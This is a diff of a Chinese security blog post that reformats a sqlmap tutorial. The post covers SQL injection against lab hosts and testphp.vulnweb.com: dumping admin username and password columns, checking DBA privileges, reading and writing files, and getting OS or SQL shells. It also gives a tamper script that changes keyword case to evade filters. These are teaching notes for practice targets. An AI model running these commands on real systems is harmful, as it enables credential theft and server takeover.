@@ -7,15 +7,15 @@
 <meta name="full-screen" content="yes">
 <meta name="theme-color" content="#317EFB" />
 <meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
-<meta name="description" content="参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;9326258.html 如果VMware虚拟机没网，检查win+R 运行 “services.msc”查看是否开启了VMware DHCP Service和VMware NAT service这两个服务，如果未开启，请启动 sqlmap需要结合你的思路，你想的绕过逻辑，然后写入sqlmap，进行绕过 数据猜解-库表列数据&amp;">
+<meta name="description" content="数据猜解-库表列数据&amp;字典Access数据库，电子科技大学（dbs，dba和current-db命令并不适用于access，因为结构不同）  先检查是否存在SQL注入点 1python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.126.133:89&#x2F;News.asp?classid&#x3D;1&quot;  枚举数据库中的所有表 1python sqlmap.py -u">
 <meta property="og:type" content="article">
 <meta property="og:title" content="注入工具&amp;SQLMAP&amp;Tamper编写&amp;指纹修改&amp;高权限操作&amp;目录架构">
 <meta property="og:url" content="http://example.com/2024/03/22/Web%E6%94%BB%E9%98%B26/index.html">
 <meta property="og:site_name" content="Cypher Sun">
-<meta property="og:description" content="参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;9326258.html 如果VMware虚拟机没网，检查win+R 运行 “services.msc”查看是否开启了VMware DHCP Service和VMware NAT service这两个服务，如果未开启，请启动 sqlmap需要结合你的思路，你想的绕过逻辑，然后写入sqlmap，进行绕过 数据猜解-库表列数据&amp;">
+<meta property="og:description" content="数据猜解-库表列数据&amp;字典Access数据库，电子科技大学（dbs，dba和current-db命令并不适用于access，因为结构不同）  先检查是否存在SQL注入点 1python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.126.133:89&#x2F;News.asp?classid&#x3D;1&quot;  枚举数据库中的所有表 1python sqlmap.py -u">
 <meta property="og:locale">
 <meta property="article:published_time" content="2024-03-21T21:21:00.000Z">
-<meta property="article:modified_time" content="2024-03-23T08:12:26.499Z">
+<meta property="article:modified_time" content="2024-03-23T08:20:00.122Z">
 <meta property="article:author" content="Cypher Sun">
 <meta name="twitter:card" content="summary">
 
@@ -57,7 +57,7 @@
 
 <!-- Variable -->
 <script>window.ASYNC_CONFIG = {"hostname":"example.com","author":"Cypher Sun","root":"/","typed_text":["I`m a cybersecurity engineer","Welcome to my blog!"],"theme_version":"2.1.10","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","appleTouchIcon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","user_tag":"fas fa-user-alt","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
-<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-23 16:12:26"};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-03-23 16:20:00"};</script>
 
 <!-- Theme mode css -->
 <link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.1.10" id="trm-switch-style">
@@ -377,27 +377,66 @@
 </div>
 <div class="trm-card ">
     <article id="article-container" class="trm-publication">
-    <p>参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
-<p>如果VMware虚拟机没网，检查win+R 运行 “services.msc”查看是否开启了VMware DHCP Service和VMware NAT service这两个服务，如果未开启，请启动</p>
-<p>sqlmap需要结合你的思路，你想的绕过逻辑，然后写入sqlmap，进行绕过</p>
-<h2 id="数据猜解-库表列数据-字典"><a href="#数据猜解-库表列数据-字典" class="headerlink" title="数据猜解-库表列数据&amp;字典"></a>数据猜解-库表列数据&amp;字典</h2><p>后期想要添加字典在默认的common-tables里面添加</p>
-<p>测试：<a target="_blank" rel="noopener" href="http://vulnweb.com/">http://vulnweb.com/</a></p>
-<p>Access数据库，科技大学例子（dbs，dba和current-db命令并不适用于access，因为结构不同）<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.126.133:89/News.asp?classid=1">http://192.168.126.133:89/News.asp?classid=1</a>“<br>先检查是否存在SQL注入点</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.126.133:89/News.asp?classid=1">http://192.168.126.133:89/News.asp?classid=1</a>“ –tables<br>枚举数据库中的所有表</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.126.133:89/News.asp?classid=1">http://192.168.126.133:89/News.asp?classid=1</a>“ –columns -T “admin”<br>枚举指定表admin的所有列</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.126.133:89/News.asp?classid=1">http://192.168.126.133:89/News.asp?classid=1</a>“ –dump -C  “username,password” -T “admin”<br>从admin表中导出username和password列的数据（需要等待它完全跑完admin所以列才执行）</p>
-<p>Mysql数据库news.php高权限例子<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“<br>先检查是否存在SQL注入点</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –is-dba<br>查看是不是数据管理员（不准确，有时候是的，有时候不是）</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –current-user<br>查看当前用户（进一步确认是不是root）</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –privileges<br>查看当前用户权限（进一步用户权限）</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –current-db<br>获取当前数据库，对于mysql，需要获取当前数据库（因为比access高了一等级，所以需要多一步）</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –tables -D “demo01”<br>枚举指定数据库demo01下的所有表</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –columns -T “admin” -D “demo01”<br>枚举指定数据库acuart，表users下的所有列</p>
-<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –dump -C “username,password” -T “admin” -D “demo01”<br>从users表中导出name和pass列的数据</p>
-<p>其他操作：<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –sql-shell<br>执行shell命令</p>
+    <h2 id="数据猜解-库表列数据-字典"><a href="#数据猜解-库表列数据-字典" class="headerlink" title="数据猜解-库表列数据&amp;字典"></a>数据猜解-库表列数据&amp;字典</h2><p><strong>Access数据库，电子科技大学</strong>（dbs，dba和current-db命令并不适用于access，因为结构不同）</p>
+<ol>
+<li><p>先检查是否存在SQL注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.133:89/News.asp?classid=1&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>枚举数据库中的所有表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.133:89/News.asp?classid=1&quot;</span> --tables</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>枚举指定表admin的所有列</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.133:89/News.asp?classid=1&quot;</span> --columns -T <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从admin表中导出username和password列的数据（需要等待它完全跑完admin所以列才执行）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.133:89/News.asp?classid=1&quot;</span> --dump -C  <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<br>
+<br>
+
+<p><strong>Mysql数据库news.php高权限</strong></p>
+<p>先检查是否存在SQL注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<p>查看是不是数据管理员（不准确，有时候是的，有时候不是）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --is-dba </span><br></pre></td></tr></table></figure>
+<br>
+
+<p>查看当前用户（进一步确认是不是root）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --current-user</span><br></pre></td></tr></table></figure>
+<br>
+
+<p>查看当前用户权限（进一步用户权限）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --privileges</span><br></pre></td></tr></table></figure>
+<br>
+
+<p>获取当前数据库，对于mysql，需要获取当前数据库（因为比access高了一等级，所以需要多一步）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
+<br>
+
+<p>枚举指定数据库demo01下的所有表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --tables -D <span class="string">&quot;demo01&quot;</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<p>枚举指定数据库acuart，表users下的所有列</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --columns -T <span class="string">&quot;admin&quot;</span> -D <span class="string">&quot;demo01&quot;</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<p>从users表中导出name和pass列的数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://10.0.1.139/sqli/new.php?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;admin&quot;</span> -D <span class="string">&quot;demo01&quot;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<p><strong>其他操作</strong>：<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –sql-shell<br>执行shell命令</p>
 <p>select * from admin</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –os-shell<br>使用高权限的来执行系统交互命令</p>
-<p>Mysql数据库vulnweb低权限例子<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“<br>先检查是否存在SQL注入点</p>
+<br>
+
+
+
+<p><strong>Mysql数据库vulnweb低权限</strong><br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“<br>先检查是否存在SQL注入点</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –is-dba<br>查看是不是数据管理员</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –current-user<br>查看当前用户（进一步确认是不是root）</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –privileges<br>查看当前用户权限（进一步用户权限）</p>
@@ -406,7 +445,7 @@
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –tables -D “acuart”<br>枚举指定数据库acuart下的所有表</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –columns -T “users” -D “acuart”<br>枚举指定数据库acuart，表users下的所有列</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –dump -C “name,pass” -T “users” -D “acuart”<br>从users表中导出name和pass列的数据</p>
-<p>其他操作：<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –dump -all<br>导出所有的数据</p>
+<p>其他操作：<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a>“ –dump -all<br>导出所有的数据<br><br></p>
 <h2 id="权限操作-文件-命令-交互式"><a href="#权限操作-文件-命令-交互式" class="headerlink" title="权限操作-文件&amp;命令&amp;交互式"></a>权限操作-文件&amp;命令&amp;交互式</h2><p>测试：MYSQL高权限注入<br>引出权限：<br>–is-dba –privileges<br>引出文件：<br>–file-read –file-write –file-dest<br>引出命令：<br>–os-cmd&#x3D; –os-shell –sql-shell</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –is-dba<br>查看是不是数据管理员（不准确，有时候是的，有时候不是）</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –privileges<br>查看当前用户权限（进一步用户权限）</p>
@@ -440,6 +479,8 @@
 <p>{<br>  “username”: “admin*”,<br>  “password”: “admin*”<br>}</p>
 <p>运行之前需要删除cookie<br>python sqlmap.py -r head1.txt</p>
 <p>所以就是推荐使用-r模式，比-data模式好用</p>
+<p>后期想要添加字典在默认的common-tables里面添加</p>
+<p>测试：<a target="_blank" rel="noopener" href="http://vulnweb.com/">http://vulnweb.com/</a></p>
 <h2 id="绕过模块-Tamper脚本-使用-开发"><a href="#绕过模块-Tamper脚本-使用-开发" class="headerlink" title="绕过模块-Tamper脚本-使用&amp;开发"></a>绕过模块-Tamper脚本-使用&amp;开发</h2><p>测试：base64注入 有过滤的注入</p>
 <p>写一个test.py的脚本放到sqlmap\tamper里面</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    <span class="keyword">if</span> payload:      </span><br><span class="line">        payload = payload.replace(<span class="string">&#x27;SELECT&#x27;</span>,<span class="string">&#x27;sElEct&#x27;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&#x27;OR&#x27;</span>,<span class="string">&#x27;Or&#x27;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&#x27;AND&#x27;</span>,<span class="string">&#x27;And&#x27;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&#x27;SLEEP&#x27;</span>,<span class="string">&#x27;SleeP&#x27;</span>)</span><br><span class="line">        payload = payload.replace(<span class="string">&#x27;ELT&#x27;</span>,<span class="string">&#x27;Elt&#x27;</span>)</span><br><span class="line">    <span class="built_in">return</span> payload</span><br></pre></td></tr></table></figure>
@@ -457,6 +498,9 @@
 <p>如果访问过快就换拦截，time-sec来延时<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ -v 4 –time-sec 5</p>
 <h2 id="使用更多的测试：测试Header注入"><a href="#使用更多的测试：测试Header注入" class="headerlink" title="使用更多的测试：测试Header注入"></a>使用更多的测试：测试Header注入</h2><p>–level&#x3D;(1-5) #要执行的测试水平等级，默认为1 ，测试的深度<br>–risk&#x3D;(0-3)  #测试执行的风险等级，默认为1</p>
 <p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://10.0.1.139/sqli/new.php?id=1">http://10.0.1.139/sqli/new.php?id=1</a>“ –level&#x3D;3 -risk&#x3D;2<br>能帮你跑到隐藏的一些ua头注入等等</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a></p>
+<p>如果VMware虚拟机没网，检查win+R 运行 “services.msc”查看是否开启了VMware DHCP Service和VMware NAT service这两个服务，如果未开启，请启动</p>
+<p>sqlmap需要结合你的思路，你想的绕过逻辑，然后写入sqlmap，进行绕过</p>
 
 </article>
     
